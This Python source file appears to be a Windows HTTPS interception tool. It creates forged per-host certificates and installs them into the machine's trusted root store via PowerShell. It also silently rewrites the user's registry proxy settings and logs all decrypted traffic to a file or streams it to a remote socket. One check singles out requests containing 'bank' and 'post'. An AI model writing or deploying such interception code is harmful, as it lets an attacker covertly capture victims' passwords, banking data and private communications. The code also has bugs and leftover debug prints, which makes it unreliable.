from __future__ import annotations

import os
import random
import ssl
from typing import Tuple, Optional, Union, TextIO
from mitm import MITM, middleware, Connection, protocol, crypto, __data__
from mitm.crypto import new_RSA, new_X509

from network import send
from socket import socket
from threading import Thread
import sys
import winreg
from asyncio import CancelledError
import pathlib
import certifi
from OpenSSL import crypto as cry

my_socket: Optional[socket] = None
file: Optional[TextIO] = None
mitm: Optional[MITM] = None
installed_hosts = []


async def new_pair(
    host: str,
    key_path: Optional[pathlib.Path] = None,
    cert_path: Optional[pathlib.Path] = None,
) -> Tuple[bytes, bytes]:
    """
    Generates an RSA and self-signed X509 certificate for use with TLS/SSL.

    The X509 certificate is self-signed and is not signed by any other certificate
    authority, containing default values for its fields.

    Args:
        key_path: Optional path to save key.
        cert_path: Optional path to save cert.

    Returns:
        tuple: Key and certificate bytes ready to be saved.
    """
    print("11")
    rsa = new_RSA()
    print("12")
    cert = new_X509(common_name=host, organization_name="oops", organization_unit_name="oops")
    print("13")
    # Sets the certificate public key, and signs it.
    cert.set_pubkey(rsa)
    cert.sign(rsa, "sha256")
    print("14")
    # Dumps the .crt and .key files as bytes.
    key = cry.dump_privatekey(cry.FILETYPE_PEM, rsa)
    crt = cry.dump_certificate(cry.FILETYPE_PEM, cert)
    print("15")
    # Stores they .crt and .key file if specified.
    if key_path:
        key_path.parent.mkdir(parents=True, exist_ok=True)
        with key_path.open("wb") as file:
            file.write(key)
    if cert_path:
        cert_path.parent.mkdir(parents=True, exist_ok=True)
        with cert_path.open("wb") as file:
            file.write(crt)
    print("16")
    return key, crt


async def start_connection(connection: Connection, data):
    print("what")
    if b"CONNECT" in data:
        print("whatttt")
        host = data[data.find(b" ")+1: data.find(b":")]
        print("OK")
    else:
        return
    print("Wow")
    if host not in installed_hosts:
        print("1")
        rsa_key, rsa_cert = __data__ / f"{host}.key", __data__ / f"{host}.crt"
        print("2")
        await new_pair(host, key_path=rsa_key, cert_path=rsa_cert)
        print("3")
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        print("4")
        context.load_cert_chain(certfile=rsa_cert, keyfile=rsa_key)
        connection.ssl_context = context
        print(host)
        install_cert(rsa_cert)
        os.remove(rsa_key)
        os.remove(rsa_cert)
        installed_hosts.append(host)


class FileLog(middleware.Middleware):
    @staticmethod
    async def mitm_started(host: str, port: int):
        file.write("MITM started on %s:%d.\n" % (host, port))
        print("MITM started on %s:%d.\n" % (host, port))

    @staticmethod
    async def client_connected(connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        file.write("Client %s:%i has connected.\n" % (host, port))
        print("Client %s:%i has connected.\n" % (host, port))

    @staticmethod
    async def server_connected(connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        file.write("Connected to server %s:%i.\n" % (host, port))
        print("Connected to server %s:%i.\n" % (host, port))

    @staticmethod
    async def client_data(connection: Connection, data: bytes) -> bytes:
        file.write("Client to server: \n\n\t%s\n" % data)
        # print("Client to server: \n\n\t%s\n" % data)
        await start_connection(connection, data)
        if b"bank" in data and b"post" in data:
            print(data)
        else:
            print(data)
        return data

    @staticmethod
    async def server_data(connection: Connection, data: bytes) -> bytes:
        file.write("Server to client: \n\n\t%s\n" % data)
        # print("Server to client: \n\n\t%s\n" % data)
        return data

    @staticmethod
    async def client_disconnected(connection: Connection):
        file.write("Client has disconnected.\n")
        # print("Client has disconnected.\n")

    @staticmethod
    async def server_disconnected(connection: Connection):
        file.write("Server has disconnected.")
        # print("Server has disconnected.")


class NetLog(middleware.Middleware):
    @staticmethod
    async def mitm_started(host: str, port: int):
        send("MITM started on %s:%d." % (host, port), my_socket)

    @staticmethod
    async def client_connected(connection: Connection):
        start_connection(connection)
        host, port = connection.client.writer._transport.get_extra_info("peername")
        send("Client %s:%i has connected." % (host, port), my_socket)

    @staticmethod
    async def server_connected(connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        send("Connected to server %s:%i." % (host, port), my_socket)

    @staticmethod
    async def client_data(connection: Connection, data: bytes) -> bytes:
        send("Client to server: \n\n\t%s\n" % data, my_socket)
        return data

    @staticmethod
    async def server_data(connection: Connection, data: bytes) -> bytes:
        send("Server to client: \n\n\t%s\n" % data, my_socket)
        return data

    @staticmethod
    async def client_disconnected(connection: Connection):
        send("Client has disconnected.", my_socket)

    @staticmethod
    async def server_disconnected(connection: Connection):
        send("Server has disconnected.", my_socket)


def set_reg(name, value, size):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, size, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False


def install_cert(host: str | None = None):
    path = __data__.joinpath(f"mitm.crt") if not host else host
    os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")


def filestart(path: str) -> bool:
    global file
    if file or my_socket:
        return False
    file = open(path, "wt")
    t = Thread(target=__start)
    t.start()
    return True


def netstart(address: Tuple[str, int]) -> bool:
    global my_socket
    if file or my_socket:
        return False
    my_socket = socket()
    my_socket.connect(address)
    t = Thread(target=__start)
    t.start()
    return True


def __start() -> bool:
    global mitm
    if my_socket and file:
        return False
    logger: Optional[type(middleware.Middleware)] = None
    if my_socket:
        logger = NetLog
    elif file:
        logger = FileLog
    else:
        return False

    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
    #sys.stdout.write("yes")
    if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
        return False
    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
    #sys.stdout.write("yes")
    if not set_reg("ProxyServer", "127.0.0.1:8880", winreg.REG_SZ):
        return False
    mitm = MITM(middlewares=[logger],
                host="127.0.0.1",
                port=8880,
                protocols=[protocol.HTTP],
                buffer_size=8192,
                timeout=5,
                ssl_context=crypto.mitm_ssl_default_context())
    install_cert()
    try:
        mitm.run()
    except CancelledError:
        print("Wow")
    return True


def stop_sniffing() -> bool:
    global my_socket, file
    if not mitm:
        return False
    mitm.stop()
    if my_socket:
        my_socket.close()
    if file:
        file.close()
    my_socket = None
    file = None
    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0')
    #sys.stdout.write("yes")
    set_reg("ProxyEnable", 0, winreg.REG_DWORD)
    return True

